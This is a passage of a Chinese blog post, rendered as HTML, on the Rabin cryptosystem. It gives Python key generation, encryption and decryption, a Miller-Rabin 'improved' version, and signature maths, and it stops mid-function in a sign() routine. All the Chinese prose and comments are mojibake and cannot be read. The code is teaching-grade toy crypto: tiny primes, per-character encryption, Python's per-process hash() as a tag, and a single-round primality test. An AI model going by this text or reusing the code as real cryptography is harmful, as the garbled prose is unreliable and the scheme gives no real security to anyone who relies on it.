class="comment">#ç§˜é’¥ç”Ÿæˆå‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_getkeys</span>():</span></span><br><span class="line">    pks=[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>,<span class="number">1100</span>) <span class="keyword">if</span> isPrime(i) <span class="keyword">and</span> i%<span class="number">4</span>==<span class="number">3</span>]</span><br><span class="line">    p=random.choice(pks)</span><br><span class="line">    q=random.choice(pks)</span><br><span class="line">    <span class="keyword">while</span> p==q:</span><br><span class="line">        q=random.choice(pks)</span><br><span class="line">    key=p*q</span><br><span class="line">    keys=[p,q,key]</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"><span class="comment">#åŠ å¯†å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_encode</span>(<span class="params">message,key</span>):</span></span><br><span class="line">    plaintext=message</span><br><span class="line">    ciphertext=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> plaintext:</span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>(<span class="built_in">hash</span>(<span class="built_in">str</span>(<span class="built_in">ord</span>(i))))) <span class="comment"># åŠ å…¥hashæ ‡è¯†(å½“ç„¶ä»…ä»…æ˜¯åœ¨åŒä¸€ä¸ªç¨‹åºè¿›ç¨‹ä¸­æ‰æœ‰æ•ˆï¼Œpythonå†…ç½®hashçš„å‡½æ•°æ˜¯å°†strçš„å‚¨å­˜åœ°å€å½“ä½œæ ‡æ—¶è¿›è¡Œè½¬æ¢çš„ï¼Œä¸åŒè¿›ç¨‹çš„ç›¸åŒå­—ç¬¦çš„åœ°å€ä¸ä¸€æ ·ï¼Œå½“ç„¶å¯æ¢æˆå…¶å®ƒç±»å‹çš„hashå‡½æ•°)</span></span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>((<span class="built_in">ord</span>(i))*(<span class="built_in">ord</span>(i))%key))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="comment">#è§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_decode</span>(<span class="params">message,p,q</span>):</span></span><br><span class="line">    ciphertext=message</span><br><span class="line">    plaintext=[]</span><br><span class="line">    temp=<span class="number">0</span></span><br><span class="line">    <span class="comment"># æ‹“å±•æ¬§å‡ é‡Œå¾—</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line">        <span class="keyword">if</span> (i*q)%p==<span class="number">1</span>:</span><br><span class="line">            temp=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    a=q*temp</span><br><span class="line">    temp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(q):</span><br><span class="line">        <span class="keyword">if</span> (i*p)%q==<span class="number">1</span>:</span><br><span class="line">            temp=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    b=p*temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">1</span>: <span class="comment"># ç•¥è¿‡hashæ ‡è¯†</span></span><br><span class="line">            m_temp=[]</span><br><span class="line">            m=[]</span><br><span class="line">            m_temp.append(<span class="built_in">pow</span>(<span class="built_in">int</span>(ciphertext[i]),(p+<span class="number">1</span>)//<span class="number">4</span>)%p) <span class="comment">#è¿™é‡Œè¦ç”¨// æ•´æ•°é™¤æ³•</span></span><br><span class="line">            m_temp.append(p-<span class="built_in">pow</span>(<span class="built_in">int</span>(ciphertext[i]),(p+<span class="number">1</span>)//<span class="number">4</span>)%p)</span><br><span class="line">            m_temp.append(<span class="built_in">pow</span>(<span class="built_in">int</span>(ciphertext[i]),(q+<span class="number">1</span>)//<span class="number">4</span>)%q)</span><br><span class="line">            m_temp.append(q-<span class="built_in">pow</span>(<span class="built_in">int</span>(ciphertext[i]),(q+<span class="number">1</span>)//<span class="number">4</span>)%q)</span><br><span class="line">            <span class="comment"># ä¸­å›½å‰©ä½™å®šç†</span></span><br><span class="line">            m.append((a*m_temp[<span class="number">0</span>]+b*m_temp[<span class="number">2</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">0</span>]+b*m_temp[<span class="number">3</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">1</span>]+b*m_temp[<span class="number">2</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">1</span>]+b*m_temp[<span class="number">3</span>])%(p*q))</span><br><span class="line">            <span class="keyword">for</span> each_m <span class="keyword">in</span> m:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">hash</span>(<span class="built_in">str</span>(each_m))==<span class="built_in">int</span>(ciphertext[i-<span class="number">1</span>]):</span><br><span class="line">                    plaintext.append(<span class="built_in">chr</span>(each_m))</span><br><span class="line">                    <span class="keyword">break</span> <span class="comment">#è¦breakï¼Œå¦åˆ™å€¼é‡å¤</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.perf_counter()</span><br><span class="line">    keys=Rabin_getkeys() <span class="comment"># ç”Ÿæˆå…¬é’¥å¯†é’¥</span></span><br><span class="line">    <span class="built_in">print</span> (keys)  <span class="comment">#æ‰“å°å…¬é’¥ä¸ç§é’¥ï¼Œå‰ä¸¤ä½ä¸ºç§é’¥ç”¨äºè§£å¯†ï¼Œæœ€åä¸€ä½ä¸ºå…¬é’¥ï¼Œç”¨äºåŠ å¯†</span></span><br><span class="line">    message=<span class="string">&quot;Hello,rabin&quot;</span></span><br><span class="line">    cipher=Rabin_encode(message,keys[-<span class="number">1</span>]) <span class="comment"># ç”Ÿæˆå¯†æ–‡</span></span><br><span class="line">    <span class="built_in">print</span>(cipher)</span><br><span class="line">    <span class="built_in">print</span>(Rabin_decode(cipher,keys[<span class="number">0</span>],keys[<span class="number">1</span>]))  <span class="comment">#æ‰“å°è§£å¯†ç»“æœ</span></span><br><span class="line">    end = time.perf_counter()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¿è¡Œæ—¶é—´&quot;</span>, end - start)</span><br></pre></td></tr></table></figure><h4 id="RabinåŠ å¯†ä½“åˆ¶-æ”¹è¿›"><a href="#RabinåŠ å¯†ä½“åˆ¶-æ”¹è¿›" class="headerlink" title="RabinåŠ å¯†ä½“åˆ¶-æ”¹è¿›"></a>RabinåŠ å¯†ä½“åˆ¶-æ”¹è¿›</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># ä½¿ç”¨äº†Miller_Rabinå’Œå¿«é€Ÿå¹‚è¿›è¡Œä¼˜åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç´ æ•°åˆ¤å®šå‡½æ•°</span></span><br><span class="line"><span class="comment"># Miller_Rabin æ³•åˆ¤å®šæ˜¯å¦ä¸ºç´ æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_power_mod</span>(<span class="params">base, power, n</span>):</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    tmp = base</span><br><span class="line">    <span class="keyword">while</span> power &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> power&amp;<span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            result = (result * tmp) % n</span><br><span class="line">        tmp = (tmp * tmp) % n </span><br><span class="line">        power = power&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_power</span>(<span class="params">base, power</span>):</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    tmp = base</span><br><span class="line">    <span class="keyword">while</span> power &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> power&amp;<span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            result = (result * tmp)</span><br><span class="line">        tmp = (tmp * tmp)</span><br><span class="line">        power = power&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Miller_Rabin</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> p == <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    m, k = p - <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> m % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        m, k = m // <span class="number">2</span>, k + <span class="number">1</span></span><br><span class="line">    a = random.randint(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">    x = fast_power_mod(a, m, p)</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == p - <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> k &gt; <span class="number">1</span>:</span><br><span class="line">        x = fast_power_mod(x, <span class="number">2</span>, p)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> x == p - <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        k = k - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç§˜é’¥ç”Ÿæˆå‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_getkeys</span>():</span></span><br><span class="line">    pks=[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>,<span class="number">1100</span>) <span class="keyword">if</span> Miller_Rabin(i) <span class="keyword">and</span> i%<span class="number">4</span>==<span class="number">3</span>]</span><br><span class="line">    p=random.choice(pks)</span><br><span class="line">    q=random.choice(pks)</span><br><span class="line">    <span class="keyword">while</span> p==q:</span><br><span class="line">        q=random.choice(pks)</span><br><span class="line">    key=p*q</span><br><span class="line">    keys=[p,q,key]</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"><span class="comment">#åŠ å¯†å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_encode</span>(<span class="params">message,key</span>):</span></span><br><span class="line">    plaintext=message</span><br><span class="line">    ciphertext=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> plaintext:</span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>(<span class="built_in">hash</span>(<span class="built_in">str</span>(<span class="built_in">ord</span>(i))))) <span class="comment"># åŠ å…¥hashæ ‡è¯†(å½“ç„¶ä»…ä»…æ˜¯åœ¨åŒä¸€ä¸ªç¨‹åºè¿›ç¨‹ä¸­æ‰æœ‰æ•ˆï¼Œpythonå†…ç½®hashçš„å‡½æ•°æ˜¯å°†strçš„å‚¨å­˜åœ°å€å½“ä½œæ ‡æ—¶è¿›è¡Œè½¬æ¢çš„ï¼Œä¸åŒè¿›ç¨‹çš„ç›¸åŒå­—ç¬¦çš„åœ°å€ä¸ä¸€æ ·ï¼Œå½“ç„¶å¯æ¢æˆå…¶å®ƒç±»å‹çš„hashå‡½æ•°)</span></span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>((<span class="built_in">ord</span>(i))*(<span class="built_in">ord</span>(i))%key))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="comment">#è§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_decode</span>(<span class="params">message,p,q</span>):</span></span><br><span class="line">    ciphertext=message</span><br><span class="line">    plaintext=[]</span><br><span class="line">    temp=<span class="number">0</span></span><br><span class="line">    <span class="comment"># æ‹“å±•æ¬§å‡ é‡Œå¾—</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line">        <span class="keyword">if</span> (i*q)%p==<span class="number">1</span>:</span><br><span class="line">            temp=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    a=q*temp</span><br><span class="line">    temp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(q):</span><br><span class="line">        <span class="keyword">if</span> (i*p)%q==<span class="number">1</span>:</span><br><span class="line">            temp=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    b=p*temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">1</span>: <span class="comment"># ç•¥è¿‡hashæ ‡è¯†</span></span><br><span class="line">            m_temp=[]</span><br><span class="line">            m=[]</span><br><span class="line">            m_temp.append(fast_power(<span class="built_in">int</span>(ciphertext[i]),(p+<span class="number">1</span>)//<span class="number">4</span>)%p) <span class="comment">#è¿™é‡Œè¦ç”¨// æ•´æ•°é™¤æ³•</span></span><br><span class="line">            m_temp.append(p-fast_power(<span class="built_in">int</span>(ciphertext[i]),(p+<span class="number">1</span>)//<span class="number">4</span>)%p)</span><br><span class="line">            m_temp.append(fast_power(<span class="built_in">int</span>(ciphertext[i]),(q+<span class="number">1</span>)//<span class="number">4</span>)%q)</span><br><span class="line">            m_temp.append(q-fast_power(<span class="built_in">int</span>(ciphertext[i]),(q+<span class="number">1</span>)//<span class="number">4</span>)%q)</span><br><span class="line">            <span class="comment"># ä¸­å›½å‰©ä½™å®šç†</span></span><br><span class="line">            m.append((a*m_temp[<span class="number">0</span>]+b*m_temp[<span class="number">2</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">0</span>]+b*m_temp[<span class="number">3</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">1</span>]+b*m_temp[<span class="number">2</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">1</span>]+b*m_temp[<span class="number">3</span>])%(p*q))</span><br><span class="line">            <span class="keyword">for</span> each_m <span class="keyword">in</span> m:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">hash</span>(<span class="built_in">str</span>(each_m))==<span class="built_in">int</span>(ciphertext[i-<span class="number">1</span>]):</span><br><span class="line">                    plaintext.append(<span class="built_in">chr</span>(each_m))</span><br><span class="line">                    <span class="keyword">break</span> <span class="comment">#è¦breakï¼Œå¦åˆ™å€¼é‡å¤</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.perf_counter()</span><br><span class="line">    keys=Rabin_getkeys() <span class="comment"># ç”Ÿæˆå…¬é’¥å¯†é’¥</span></span><br><span class="line">    <span class="built_in">print</span> (keys)  <span class="comment">#æ‰“å°å…¬é’¥ä¸ç§é’¥ï¼Œå‰ä¸¤ä½ä¸ºç§é’¥ç”¨äºè§£å¯†ï¼Œæœ€åä¸€ä½ä¸ºå…¬é’¥ï¼Œç”¨äºåŠ å¯†</span></span><br><span class="line">    message=<span class="string">&quot;Hello,rabin&quot;</span></span><br><span class="line">    cipher=Rabin_encode(message,keys[-<span class="number">1</span>]) <span class="comment"># ç”Ÿæˆå¯†æ–‡</span></span><br><span class="line">    <span class="built_in">print</span>(cipher)</span><br><span class="line">    <span class="built_in">print</span>(Rabin_decode(cipher,keys[<span class="number">0</span>],keys[<span class="number">1</span>]))  <span class="comment">#æ‰“å°è§£å¯†ç»“æœ</span></span><br><span class="line">    end = time.perf_counter()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¿è¡Œæ—¶é—´&quot;</span>, end - start)</span><br></pre></td></tr></table></figure><h3 id="Rabinå…¬é’¥åŠ å¯†ä½“åˆ¶çš„åº”ç”¨åœºæ™¯"><a href="#Rabinå…¬é’¥åŠ å¯†ä½“åˆ¶çš„åº”ç”¨åœºæ™¯" class="headerlink" title="Rabinå…¬é’¥åŠ å¯†ä½“åˆ¶çš„åº”ç”¨åœºæ™¯"></a>Rabinå…¬é’¥åŠ å¯†ä½“åˆ¶çš„åº”ç”¨åœºæ™¯</h3><p>Rabinå…¬é’¥åŠ å¯†ä½“åˆ¶å®é™…ä¸Šå°±æ˜¯ä¸€ç§RSAç®—æ³•çš„ç‰¹ä¾‹ï¼Œåœ¨å®é™…åº”ç”¨ä¸­ï¼ŒRabinå…¬é’¥åŠ å¯†ä½“åˆ¶ä¸»è¦è¢«ç”¨äºç­¾åç®—æ³•ã€‚</p><h4 id="æ•°å­—ç­¾åç®—æ³•"><a href="#æ•°å­—ç­¾åç®—æ³•" class="headerlink" title="æ•°å­—ç­¾åç®—æ³•"></a>æ•°å­—ç­¾åç®—æ³•</h4><p>Rabin å¯†ç ç³»ç»Ÿå¯ç”¨äºåˆ›å»ºå’ŒéªŒè¯æ•°å­—ç­¾åã€‚åˆ›å»ºç­¾åéœ€è¦ç§é’¥ (<em>p</em>,<em>q</em>) , éªŒè¯ç­¾åéœ€è¦å…¬é’¥<em>n</em>.</p><p><strong>ç­¾åï¼š</strong></p><p>ä¸€ä¸ªæ¶ˆæ¯ <em>m</em>&lt;<em>n</em> å¯ä»¥ç”¨ç§é’¥ç­¾å(<em>p</em>,<em>q</em>) å¦‚ä¸‹ã€‚</p><p>1.ç”Ÿæˆéšæœºå€¼ <em>u</em>.</p><p>2.ä½¿ç”¨åŠ å¯†å“ˆå¸Œå‡½æ•°H è®¡ç®—<em>c</em>=<em>H</em>(<em>m</em>|<em>u</em>)ï¼Œå…¶ä¸­æ¡å½¢è¡¨ç¤ºä¸²è”ã€‚<em>c</em>åº”è¯¥å°äº<em>n</em>.</p><p>3.å¯¹å¾… <em>c</em>ä½œä¸º Rabin åŠ å¯†çš„å€¼å¹¶å°è¯•ä½¿ç”¨ç§é’¥ (<em>p,q</em>) å¯¹å…¶è¿›è¡Œè§£å¯†.<br>è¿™å°†äº§ç”Ÿé€šå¸¸çš„å››ä¸ªç»“æœï¼Œ<em>r</em>1, <em>r</em>2, <em>r</em>3, <em>r</em>4.</p><p>4.äººä»¬å¯èƒ½æœŸæœ›åŠ å¯†æ¯ä¸ª<em>r</em>iä¼šäº§ç”Ÿ<em>c</em>, ç„¶è€Œï¼Œè¿™ä»…åœ¨ä»¥ä¸‹æƒ…å†µä¸‹æˆç«‹<em>c</em>æ°å¥½æ˜¯äºŒæ¬¡æ®‹å·®<em>p</em> å’Œ<em>q</em>. è¦ç¡®å®šæ˜¯å¦æ˜¯è¿™ç§æƒ…å†µï¼Œåº”åŠ å¯†ç¬¬ä¸€ä¸ªè§£å¯†ç»“æœ<em>r</em>1. å¦‚æœå®ƒæ²¡æœ‰åŠ å¯†åˆ°<em>c</em>, ç”¨ä¸€ä¸ªæ–°çš„éšæœºæ•°é‡å¤è¿™ä¸ªç®—æ³•. åœ¨æ‰¾åˆ°åˆé€‚çš„ç®—æ³•ä¹‹å‰éœ€è¦é‡å¤æ­¤ç®—æ³•çš„é¢„æœŸæ¬¡æ•°<em>c</em>æ˜¯4æ¬¡.</p><p>5.æ‰¾åˆ°äº†ä¸€ä¸ª<em>r</em>1åŠ å¯†åˆ°<em>c</em>ï¼Œç­¾åæ˜¯(<em>r</em>1,<em>u</em>).</p><p><strong>éªŒè¯ç­¾åï¼š</strong></p><p>ä¸€ä¸ªç­¾å(<em>r</em>,<em>u</em>)çš„<em>m</em>å¯ä»¥ä½¿ç”¨å…¬é’¥è¿›è¡ŒéªŒè¯<em>n</em> å¦‚ä¸‹ã€‚</p><p>1. è®¡ç®—<em>c</em>=<em>H</em>(<em>m</em>|<em>u</em>)ã€‚</p><p>2. ä½¿ç”¨å…¬é’¥<em>n</em>åŠ å¯†<em>r</em>ã€‚</p><p>3. å½“ä¸”ä»…å½“ <em>r</em> ç­‰äº<em>c</em>æ—¶ç­¾åæœ‰æ•ˆã€‚</p><p>ä¸‹é¢å±•ç¤ºä¸€ä¸‹Rabinæ•°å­—ç­¾åç®—æ³•çš„è¯¦ç»†è¿‡ç¨‹ã€‚</p><p>è´¨æ•° $p$ å’Œ $q$ï¼Œä¸”æœ‰$ p \equiv 3 \pmod{4}$ï¼Œ$q \equiv 3 \pmod{4}$ã€‚ç»„åˆ $(p, q)$ ä¸ºç§é’¥ï¼Œä¸¤æ•°çš„ä¹˜ç§¯ $n = pq$ ä¸ºå¯¹åº”çš„å…¬é’¥ã€‚ä½¿ç”¨ç§é’¥ $(p, q)$ å¯¹æ¶ˆæ¯ $m$ ç­¾åçš„ç»“æœä¸ºç»„åˆ $(S, U)$ï¼Œæ»¡è¶³<br>$$<br>S^2 \equiv H(m||U) \pmod{n} \tag{1}<br>$$<br>å…¶ä¸­çš„ $U$ è¢«ç§°ä¸ºå¡«å……å€¼ï¼Œ$H(m||U)$ çš„æ„æ€æ˜¯å°† $m$ å’Œ $U$ çš„äºŒè¿›åˆ¶æµæ‹¼æ¥åœ¨ä¸€èµ·åå†è®¡ç®—å“ˆå¸Œï¼Œå¹¶å°†å“ˆå¸Œç»“æœï¼ˆäºŒè¿›åˆ¶æµï¼‰çœ‹æˆä¸€ä¸ªæ•´æ•°ã€‚</p><p>ä»¤ $H = H(m||U) \bmod{n}$ æ¥ç®€åŒ–ä¹¦å†™ã€‚å½“ $U$ ç¡®å®šåï¼Œå¯ä»¥ç”¨ä¸‹å¼è®¡ç®— S çš„å€¼ã€‚<br>$$<br>S = \left[q \cdot (H^{\frac{p+1}{4}} \bmod{p}) \cdot (q^{p-2} \bmod{p}) + p \cdot (H^{\frac{q+1}{4}} \bmod{q}) \cdot (p^{q-2} \bmod{q})\right] \bmod{n} \tag{2}<br>$$<br>è¿™æ ·ä¾¿å¾—åˆ°äº†ä¸€ç»„ $(S, U)$ï¼Œå°†ç»“æœä»£å…¥ (1) å¼éªŒç®—ï¼Œè‹¥æˆç«‹åˆ™è¿”å›è¿™ç»„ç»“æœï¼Œåä¹‹åˆ™æ”¹å˜ $U$ çš„å€¼é‡æ–°è®¡ç®— $S$ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ç»„æ»¡è¶³ (1) å¼çš„è§£ã€‚</p><p>è¯·æ³¨æ„ï¼Œå½“ $p \equiv 3 \pmod{4}$ æ—¶ï¼Œ$\frac{p+1}{4}$ æ˜¯ä¸€ä¸ªæ•´æ•°ï¼ŒåŒç† $\frac{q+1}{4}$ ä¹Ÿæ˜¯ä¸€ä¸ªæ•´æ•°ã€‚</p><p>ç­¾åæ—¶ï¼Œé€šè¿‡å¾ªç¯åœ¨ $m$ åè¿½åŠ å­—èŠ‚ <code>0x00</code> æ¥æ”¹å˜ $H$ çš„å€¼ï¼Œå¹¶åœ¨è®¡ç®—å‡º $S$â€‹ åéªŒè¯ (1) å¼æ˜¯å¦æˆç«‹ï¼Œæ˜¯åˆ™è·³å‡ºå¾ªç¯è¿”å›ï¼Œå¦åˆ™ç»§ç»­å¯»æ‰¾ã€‚</p><p>é€šè¿‡ä¸Šé¢çš„æè¿°ä½ èƒ½çœ‹åˆ°ï¼ŒRabin ç­¾åçš„è®¡ç®—è¿‡ç¨‹ç›¸å¯¹å¤æ‚ï¼Œä½†éªŒè¯è¿‡ç¨‹æå…¶ç®€å•ã€‚è¿™ä¸ªç‰¹æ€§ä½¿å¾—å®ƒéå¸¸é€‚åˆåœ¨é“¾ä¸Šç›´æ¥éªŒç­¾ï¼Œè™½ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨æ¯”ç‰¹å¸è„šæœ¬ä¸­å®ç° ECDSA çš„éªŒç­¾é€»è¾‘ï¼Œä½†å®ƒçš„è®¡ç®—æˆæœ¬è¦æ¯”éªŒè¯ Rabin ç­¾åé«˜å‡ºè®¸å¤šã€‚</p><p>æ•´ä¸ªç®—æ³•è®¾è®¡åŸºäºè¿™æ ·çš„æ•°å­¦éš¾é¢˜ï¼šåœ¨æ¨¡æ˜¯å¤§åˆæ•°çš„æƒ…å†µä¸‹ï¼Œæ±‚äºŒæ¬¡å‰©ä½™å¹³æ–¹æ ¹æ˜¯å›°éš¾çš„ã€‚ä½¿ç”¨ Rabin ç­¾åæ—¶ï¼Œä¸ºäº†è·å¾—è¶³å¤Ÿçš„å®‰å…¨æ€§ï¼Œå…¬é’¥ $n$â€‹ å’Œå“ˆå¸Œ $H(m||U)$â€‹â€‹ çš„ç»“æœè‡³å°‘éœ€è¦ 3072 bitsã€‚</p><p><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">p: <span class="built_in">int</span>, q: <span class="built_in">int</span>, digest: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">tuple</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param p: part of private key</span></span><br><span class="line"><span class="string">    :param q: part of private key</span></span><br><span class="line"><span class="string">    :param digest: message digest to sign</span></span><br><span class="line"><span class="string">    :return: rabin signature (S: int, U: bytes)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    n = p * q</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        h = hash_to_int(digest + <span class="string">b&#x27;\x00&#x27;</span> * i) % n</span><br><span class="line">        lp = q * <span class="built_in">pow</span>(h, (p + <span class="number">1</span>) // <span class="number">4</span>, p) * <span class="built_in">pow</span>(q, p - <span class="number">2</span>, 